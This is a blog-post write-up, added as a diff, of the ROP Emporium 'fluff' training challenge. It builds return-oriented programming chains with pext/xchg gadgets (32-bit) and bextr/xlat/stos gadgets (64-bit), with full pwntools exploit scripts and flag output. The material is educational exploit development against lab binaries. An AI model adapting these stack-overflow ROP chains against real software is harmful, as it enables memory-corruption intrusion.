@@ -1,0 +1,501 @@
+---
+layout: post
+title:  "ROP Emporium: fluff"
+date:   2021-03-12 11:33:56 +0200
+categories: ropemporium
+---
+
+## 32-bit ##
+
+Once again, we are asked to build a ROP gadget chain so that, using ```print_file``` we get to print the name of a file. Thus, we need to write the name of the file as a string somewhere in memory, just like in the previous levels.
+The only difference this time is that we need to get more creative, as there are less evidently useful gadgets.
+Let's start by checking the basic mitigations:
+
+```
+voidwalker@Abyss:[fluffx86]** checksec fluff32
+[*] '/home/voidwalker/ROPEmporium/fluffx86/fluff32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+    RUNPATH:  b'.'
+```
+
+We are also going to need to get the addresses of ```.data``` section, as well as ```print_file```'s ```PLT``` entry:
+
+```
+voidwalker@Abyss:[fluffx86]** readelf -S fluff32 | grep data
+  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
+  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
+```
+
+```
+080483d0 <print_file@plt>:
+ 80483d0:       ff 25 14 a0 04 08       jmp    DWORD PTR ds:0x804a014
+ 80483d6:       68 10 00 00 00          push   0x10
+ 80483db:       e9 c0 ff ff ff          jmp    80483a0 <.plt>
+```
+
+Looks like the size of the ```.data``` section is also 8 bytes, just enough for our ```flag.txt``` string!
+Let's look for some ```mov``` gadgets:
+```
+voidwalker@Abyss:[fluffx86]** ropper --file fluff32 --search "mov"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: mov
+
+[INFO] File: fluff32
+0x080484e7: mov al, byte ptr [0xc9010804]; ret;
+0x0804846d: mov al, byte ptr [0xd0ff0804]; add esp, 0x10; leave; ret;
+0x080484ba: mov al, byte ptr [0xd2ff0804]; add esp, 0x10; leave; ret;
+0x080484e4: mov byte ptr [0x804a020], 1; leave; ret;
+0x0804854f: mov eax, 0xdeadbeef; ret;
+0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
+0x080484b2: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a020; call edx;
+0x08048466: mov ebp, esp; sub esp, 0x14; push 0x804a020; call eax;
+0x080484da: mov ebp, esp; sub esp, 8; call 0x450; mov byte ptr [0x804a020], 1; leave; ret;
+0x08048545: mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
+0x08048423: mov ebx, dword ptr [esp]; ret;
+0x0804837d: mov edi, 0x81000000; ret;
+0x08048548: mov edx, 0x62e2c4b0; cmc; sar byte ptr [eax - 0x21524111], 1; ret;
+0x0804847a: mov esp, 0x27; add bl, dh; ret;
+```
+
+As well as some ```pop``` gadgets:
+```
+voidwalker@Abyss:[fluffx86]** ropper --file fluff32 --search "pop"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop
+
+[INFO] File: fluff32
+0x08048525: pop ebp; lea esp, [ecx - 4]; ret;
+0x080485bb: pop ebp; ret;
+0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret;
+0x08048399: pop ebx; ret;
+0x08048558: pop ecx; bswap ecx; ret;
+0x08048524: pop ecx; pop ebp; lea esp, [ecx - 4]; ret;
+0x080485ba: pop edi; pop ebp; ret;
+0x080485b9: pop esi; pop edi; pop ebp; ret;
+0x08048527: popal; cld; ret;
+```
+
+We are also being told that there are some "useful gadgets" placed at the ```questionableGadgets``` symbol:
+
+```
+08048543 <questionableGadgets>:
+ 8048543:       89 e8                   mov    eax,ebp
+ 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa
+ 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax
+ 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef
+ 8048554:       c3                      ret
+ 8048555:       86 11                   xchg   BYTE PTR [ecx],dl
+ 8048557:       c3                      ret
+ 8048558:       59                      pop    ecx
+ 8048559:       0f c9                   bswap  ecx
+ 804855b:       c3                      ret
+ 804855c:       66 90                   xchg   ax,ax
+ 804855e:       66 90                   xchg   ax,ax
+```
+
+Let's also look at some ```xor``` gadgets, as they have proved useful in the past. For example, by doing xor between two registers and the destination register is set to all 0's, it will contain the value of the source register, similar to a ```mov``` instruction.
+
+```
+voidwalker@Abyss:[fluffx86]** ropper --file fluff32 --search "xor"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: xor
+
+[INFO] File: fluff32
+0x080485cf: xor ebx, dword ptr [edx]; add byte ptr [eax], al; add esp, 8; pop ebx; ret;
+```
+Oh well, this looks useless, since we are forced to pop into ebx at the end anyway, thus losing the ```xor```ed value.
+Perhaps we can find some ```xchg``` gadgets then?
+```
+voidwalker@Abyss:[fluffx86]** ropper --file fluff32 --search "xchg"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: xchg
+
+[INFO] File: fluff32
+0x08048555: xchg byte ptr [ecx], dl; ret;
+```
+This looks very promising combined with the ```pop ecx; bswap ecx; ret``` gadget previously found, as we could simply pass the address of ```.data``` into ```ecx```.
+Maybe we could chain this with the so-called "useful" gadgets given to us, especially that one involving the ```pext``` instruction.
+Looks like ```0xb0bababa``` is the equivalent of ```10110000101110101011101010111010``` in binary, so we must make sure that when we apply this mask to ```eax``` we get our desired characters, which we can pop off the stack through the ```pop ebp``` gadget.
+So we will have to keep an eye on those bits as we will have to do apply a mask to them, similarly to a subnetting process in networking.
+Let's arrange them so it will be easier to do the bitwise operations:
+```
+the bit value: 0  1  0  1  1  1  0  1  0  1  0  1  1  1  0  1  0  1  0  1  1  1  0  1  0  0  0  0  1  1  0  1
+bit positions: 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
+```
+
+For now, these will be the gadgets that I will be focusing on:
+```
+gadget0 = 0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
+gadget1 = 0x080485bb: pop ebp; ret;
+gadget2 = 0x08048555: xchg byte ptr [ecx], dl; ret;
+gadget3 = 0x08048558: pop ecx; bswap ecx; ret;
+```
+
+This is the attack plan I've come up so far with:
+```
+gadget3 # now we will have the address of (.data + i) inside ecx
+address of (.data + i) reversed, where i is the i'th byte of the string we are trying to write into memory
+gadget1
+a number with bits set according to the bits set of the character we want to write:
+	example: f = 01100110, so we will have to pass a number that has bits 3, 4, 9 and 11 set only
+gadget0
+gadget2
+```
+
+We are going to do this 8 times, for every character of ```flag.txt```.
+
+Now, the final script:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "i386"
+context.bits = 32
+context.endian = "little"
+context.os = "linux"
+
+# addresses
+data_addr = 0x804a018 # address of .data
+print_file = p32(0x80483d0) # address of print_file()'s PLT entry
+
+# gadget addresses
+pext_edx = p32(0x8048543) # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
+pop_ebp = p32(0x80485bb) # pop ebp; ret;
+xchg_ecx_dl = p32(0x8048555) # xchg byte ptr [ecx], dl; ret;
+pop_bswap_ecx = p32(0x8048558) # pop ecx; bswap ecx; ret;
+
+f = (1 << 0) + (1 << 1) + (1 << 3) + (1 << 6) + (1 << 8) + (1 << 9) + (1 << 11) + (1 << 14) # 01100110
+l = (1 << 0) + (1 << 2) + (1 << 3) + (1 << 4) + (1 << 6) + (1 << 7) + (1 << 9) + (1 << 10) # 01101100
+a = (1 << 1) + (1 << 2) + (1 << 6) + (1 << 8) + (1 << 10) + (1 << 11) + (1 << 12) + (1 << 14) # 01100001
+g = (1 << 1) + (1 << 3) + (1 << 4) + (1 << 6) + (1 << 8) + (1 << 9) + (1 << 11) + (1 << 14) # 01100111
+dot = (1 << 0) + (1 << 1) + (1 << 3) + (1 << 4) + (1 << 6) + (1 << 7) + (1 << 8) + (1 << 10) # 00101110
+t = (1 << 0) + (1 << 2) + (1 << 3) + (1 << 6) + (1 << 7) + (1 << 9) + (1 << 11) + (1 << 14) # 01110100
+x = (1 << 0) + (1 << 2) + (1 << 6) + (1 << 7) + (1 << 9) + (1 << 11) + (1 << 12) + (1 << 14) # 01111000
+
+# let's make it into a list so that it is easier to iterate through
+chars = [f, l, a, g, dot, t, x, t] # flag.txt
+
+e = ELF("./fluff32")
+
+io = e.process()
+
+print(io.recvuntil(">"))
+
+payload = b"A" * 44
+
+for i in range(8):
+    payload += pop_bswap_ecx
+    payload += p32(data_addr + i, endian="big")
+    payload += pop_ebp
+    payload += p32(chars[i])
+    payload += pext_edx
+    payload += xchg_ecx_dl
+
+# return to print_file
+payload += print_file
+payload += b"junk"
+payload += p32(data_addr)
+
+with open("payload", "wb") as file:
+    file.write(payload)
+
+io.sendline(payload)
+
+print(io.recvrepeat())
+```
+
+And the flag, of course:
+```
+voidwalker@Abyss:[fluffx86]** ./exploit.py
+[*] '/home/voidwalker/ROPEmporium/fluffx86/fluff32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/voidwalker/ROPEmporium/fluffx86/fluff32': pid 20246
+b'fluff by ROP Emporium\nx86\n\nYou know changing these strings means I have to rewrite my solutions...\n>'
+b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+```
+
+## 64-bit ##
+
+Alright, same as before, let's get our necessary addresses:
+
+```
+0000000000400510 <print_file@plt>:
+  400510:       ff 25 0a 0b 20 00       jmp    QWORD PTR [rip+0x200b0a]        # 601020 <print
+_file>
+  400516:       68 01 00 00 00          push   0x1
+  40051b:       e9 d0 ff ff ff          jmp    4004f0 <.plt>
+```
+And, of course, ```.data```'s address:
+```
+voidwalker@Abyss:[fluffx64]** readelf -S fluff | grep data
+  [15] .rodata           PROGBITS         00000000004006c0  000006c0
+  [23] .data             PROGBITS         0000000000601028  00001028
+```
+
+```
+0000000000400617 <usefulFunction>:
+  400617:       55                      push   rbp
+  400618:       48 89 e5                mov    rbp,rsp
+  40061b:       bf c4 06 40 00          mov    edi,0x4006c4
+  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
+  400625:       90                      nop
+  400626:       5d                      pop    rbp
+  400627:       c3                      ret
+
+0000000000400628 <questionableGadgets>:
+  400628:       d7                      xlat   BYTE PTR ds:[rbx]
+  400629:       c3                      ret
+  40062a:       5a                      pop    rdx
+  40062b:       59                      pop    rcx
+  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
+  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
+  400638:       c3                      ret
+  400639:       aa                      stos   BYTE PTR es:[rdi],al
+  40063a:       c3                      ret
+  40063b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
+```
+
+Let's get some ```pop```, ```mov``` and ```xor``` gadgets see what we can do, while also keeping in mind the previously hinted ```questionableGadgets````:
+
+```
+voidwalker@Abyss:[fluffx64]** ROPgadget --binary fluff | egrep "mov|pop|xor"
+0x0000000000400611 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
+0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
+0x00000000004005fd : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
+0x0000000000400586 : add byte ptr [rax], al ; pop rbp ; ret
+0x00000000004005fe : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
+0x0000000000400585 : add byte ptr [rax], r8b ; pop rbp ; ret
+0x00000000004005ff : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
+0x00000000004005e7 : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000400579 : je 0x400588 ; pop rbp ; mov edi, 0x601038 ; jmp rax
+0x00000000004005bb : je 0x4005c8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
+0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
+0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
+0x0000000000400602 : mov ebp, esp ; pop rbp ; jmp 0x400590
+0x000000000040057c : mov edi, 0x601038 ; jmp rax
+0x0000000000400601 : mov rbp, rsp ; pop rbp ; jmp 0x400590
+0x0000000000400625 : nop ; pop rbp ; ret
+0x0000000000400583 : nop dword ptr [rax + rax] ; pop rbp ; ret
+0x00000000004005c5 : nop dword ptr [rax] ; pop rbp ; ret
+0x00000000004005e5 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
+0x00000000004005e4 : or r12b, byte ptr [r8] ; add byte ptr [rcx], al ; pop rbp ; ret
+0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006a0 : pop r14 ; pop r15 ; ret
+0x00000000004006a2 : pop r15 ; ret
+0x0000000000400604 : pop rbp ; jmp 0x400590
+0x000000000040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
+0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400588 : pop rbp ; ret
+0x00000000004006a3 : pop rdi ; ret
+0x00000000004006a1 : pop rsi ; pop r15 ; ret
+0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400600 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
+```
+
+Let's get some things straight first. What ```xlat BYTE PTR ds:[rbx]``` does is it basically puts the least significant byte of the value located at address ```(ds * 0x10 + rbx) + al``` and stores it into ```al```.
+It basically is the equivalent of:
+```
+mov rdx, ds ; the rdx register is not actually used I just put it here for demo purposes
+sal rdx, 4
+add rbx, rdx
+add rbx, al
+mov al, byte [rbx]
+```
+These instructions would obviously not assemble and ```rdx``` is only there so it would kindof make sense. This is just to understand what this operation does.
+And just like this we gave ourself a useful ```mov``` gadget which we could maybe use tp transfer characters from memory.
+
+Another peculiar instruction is ```bextr```. This is the best [documentation](https://www.felixcloutier.com/x86/bextr) I have found for it.
+I have also outlined its usage through an easy to follow example, as to what would happen to ```rbx``` with some easy to follow values in ```rdx``` and ```rcx```:
+```
+gef➤  p/t $rcx
+$0 = 101101110111101111101111111110
+gef➤  p/t $rdx
+$1 = 110100001011
+gef➤  p/t $rbx
+$2 = 1101111011111
+```
+Through this example I followed in ```GDB``` I really got the grasp of what this instruction does. Maaan, this architecture has too many instructions! (Which makes it even more fun, heh :D)
+We could use this gadget to extract a specific amount of data from ```rcx```.
+
+Alright so let's gather some gadgets that seem useful:
+```
+0x40062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret # 0x3ef2 = 0b11111011110010
+0x400628: xlat BYTE PTR ds:[rbx]; ret
+0x400639: stos BYTE PTR es:[rdi], al
+0x4005e7: add byte ptr [rcx], al ; pop rbp ; ret
+0x4006a3: pop rdi ; ret
+0x40054e: add byte ptr [rax], al ; ret
+0x4005e7: add byte ptr [rcx], al ; pop rbp ; ret
+0x4007c3: call qword ptr [rcx]
+0x400610: mov eax, 0 ; pop rbp ; ret
+
+```
+
+Since I also found some ``` call rcx``` gadgets, let's see the state of the registers before entering our chain:
+```
+gef➤  info reg
+rax            0xb                 0xb
+rbx            0x0                 0x0
+rcx            0x7ffff7ce32c3      0x7ffff7ce32c3
+rdx            0x0                 0x0
+rsi            0x7ffff7db45a3      0x7ffff7db45a3
+rdi            0x7ffff7db64f0      0x7ffff7db64f0
+rbp            0x7fffffffe470      0x7fffffffe470
+rsp            0x7fffffffe468      0x7fffffffe468
+r8             0xb                 0xb
+r9             0x7ffff7fe2110      0x7ffff7fe2110
+r10            0x7ffff7dc84c9      0x7ffff7dc84c9
+r11            0x246               0x246
+r12            0x400520            0x400520
+r13            0x0                 0x0
+r14            0x0                 0x0
+r15            0x0                 0x0
+rip            0x7ffff7dc8942      0x7ffff7dc8942 <pwnme+152>
+eflags         0x246               [ PF ZF IF ]
+cs             0x33                0x33
+ss             0x2b                0x2b
+ds             0x0                 0x0
+es             0x0                 0x0
+fs             0x0                 0x0
+gs             0x0                 0x0
+```
+
+The way I see it, we could use ```stos``` to incrementally write ```flag.txt``` into ```.data```, and then pop ```.data```'s address into ```rdi``` again and call ```print_file()``` through its ```PLT``` entry. We could use the ```xlat``` instruction to gradually change the value of ```al```... this will involve a lot of arithmetici since we will also have to deal with ```bextr``` in order to properly change the values of ```rbx```. In order to ease our ```bextr``` I will always set the least significant 8 bits of ```rdx``` to 0 and the next 8 bits set to ```0b00100000``` so that it is going to be enough to just pass the address I want in ```rbx``` through ```rcx```.
+So, if I will always have my ```rdx``` set to ```0b10000000000000```, which is equal to ```0x2000```, my ```bextr``` practically becomes a simple ```mov rbx, rcx``` :) (keep in mind that ```0x3ef2``` will also be added to our ```rcx```).
+All I need now is some address to pass to ```rbx``` through ```rcx```, address which contains some relevant bits out of which I could form ```flag.txt```.
+In the beginning ```al``` is equal to ```11``` (```0b1011```), so maybe by passing the address of ```.bss``` to ```rdi``` first and overwrite that with the initial value of ```al``` maybe we could get some good bits out of the overwritten ```.bss```. Since our ```.bss``` has ```8 bytes```, this means that it would look something like this:
+```1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011 1011```. How do our letters look in binary again?
+```
+f = 01100110
+l = 01101100 
+a = 01100001 
+g = 01100111 
+. = 00101110 
+t = 01110100 
+x = 01111000
+```
+Hmm, nope, unfortunately we can't.
+I will try to solve this as soon as possible. It is clear that this challenge is either very very lucrative for the ```64-bit``` variant and involves a lot of maths and patience or I am just missing something. I am going to continue with the next challenges in this series and come back to this one on another day.
+
+## Update ##
+Finally, after a lot of calculations I managed to build the ROP chain. The key here was how was I going to find addresses of already existing characters for my desired string? Well... turns out ```pwntools``` already had me covered with its ```context.binary.search()``` method!
+That's how powerful this framework is!
+Alright, enough talk.... I am proud to present to you... the final script:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "amd64"
+context.bits = 64
+context.endian = "little"
+context.os = "linux"
+context.binary = ELF("./fluff")
+
+# useful addresses
+data_addr = p64(0x60102b)
+print_file = p64(0x400510) # print_file@plt
+
+# ROP gadgets
+bextr = p64(0x40062a) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
+pop_rdi = p64(0x4006a3) # pop rdi ; ret
+xlatb = p64(0x400628) # xlatb; ret
+stos = p64(0x400639) # stos BYTE PTR es:[rdi], al
+
+# as mentioned before, al is 0xb before jumping into our ROP chain
+al = 0xb
+
+# we want our rdx se to 0xb100000000 for simplicity in bextr
+rdx = p64(0x2000)
+
+# string we want in our memory, in this case "flag.txt"
+string_flag = b'flag.txt'
+
+# use search to find addresses in memory containing relevant bytes
+e = context.binary
+
+# build "flag.txt" dictionary, each key representing a character of "flag.txt"
+# the values will represent the address in memort where this character can be found
+flag_dict = {}
+for c in string_flag:
+    flag_dict[c] = next(e.search(c))
+
+payload = 40 * b'A' # initial overflow
+
+# Let's first get address of .data into rdi
+payload += pop_rdi
+payload += data_addr
+
+# now build ROP chain for each character of our desired string
+for c in string_flag:
+    # prepare al for xlatb and get the modified address
+    mod_addr = flag_dict[c] - al
+    al = c # xlatb will change al to the dereferenced byte after xlatb
+    
+    # prepare rcx for bextr
+    rcx = p64(mod_addr - 0x3ef2)
+
+    # continue ROPchain
+    # 1. setup bextr gadget
+    payload += bextr
+    payload += rdx
+    payload += rcx
+
+    # 2. add xlatb gadget
+    payload += xlatb
+
+    # 3. add stosb gadget
+    payload += stos
+
+# and finally call print_file with the address of .data
+payload += pop_rdi
+payload += data_addr
+payload += print_file
+
+io = context.binary.process()
+
+print(io.recvuntil(">"))
+
+io.sendline(payload)
+
+print(io.recvrepeat())
+```
+
+And, of course, the flag!
+
+```
+voidwalker@Abyss:[fluffx64]** ./exploit.py
+[*] '/home/voidwalker/ROPEmporium/fluffx64/fluff'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/voidwalker/ROPEmporium/fluffx64/fluff': pid 5870
+b'fluff by ROP Emporium\nx86_64\n\nYou know changing these strings means I have to rewrite my solutions...\n>'
+b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+```
+
+Definetely one of the most, if not the most, challenging ROP gadget chains I have ever had to do.
